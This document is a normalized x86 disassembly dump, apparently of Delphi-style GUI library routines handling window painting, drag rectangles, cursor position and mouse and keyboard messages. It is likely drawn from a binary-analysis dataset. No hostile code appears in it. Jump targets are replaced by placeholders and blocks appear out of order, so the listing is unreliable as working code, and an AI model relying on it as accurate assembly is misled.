mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
sub_4354c8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_416b74
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_416b18
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_434aac
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435554
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43bbec
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_434aac
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b8e8
push eax
call InvalidateRect
push ebp
call sub_4354c8
pop ecx
test al al
je r-xdata
mov al 0x1
sub_4355f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44bae0
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_4362b4
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403360
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_435648
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43bbec
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b8e8
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_435721
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_4396f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43b8e8
push eax
call ReleaseDC
retn
sub_4357a8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax edi
call sub_4362e8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_434c50
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a08
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_4362b4
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43345c
sub_43587c
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_4358b8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_435904
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_435930
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4350b0
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43509c
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402994
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402994
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_43b8e8
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_435a14
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_435a60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403360
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403360
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_435b24
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_435b70
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_435bbc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_435cd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41fcf4
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435cde
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_435d10
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_434c50
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403314
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403360
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403360
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403360
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403360
jmp r-xdata
sub_435e00
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4156bc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_4362e8
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43509c
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_4350b0
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_41570c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_435fe0
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_434c24
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403360
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_43b8e8
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_432820
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_435fcb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_43b8e8
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_43b8e8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403164
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_434aac
test esi esi
je r-xdata
sub_435fe0
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403360
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_436e64
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403360
mov eax esi
call sub_434b54
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_434b10
mov ecx eax
xor edx edx
xor eax eax
call sub_4156e4
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403360
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_436084
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_4360b4
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_436120
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_4361e0
sub_436150
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_436180
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_434c50
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4361ac
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_4361e0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_4362b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4362e8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_436380
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_44bae0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_44bae0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_434cac
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45528c
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403360
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_44ba24
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403360
jmp r-xdata
sub_436514
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4086b4
mov edi eax
mov eax [ esi + 0x64 ]
call sub_4086e0
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_434cac
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
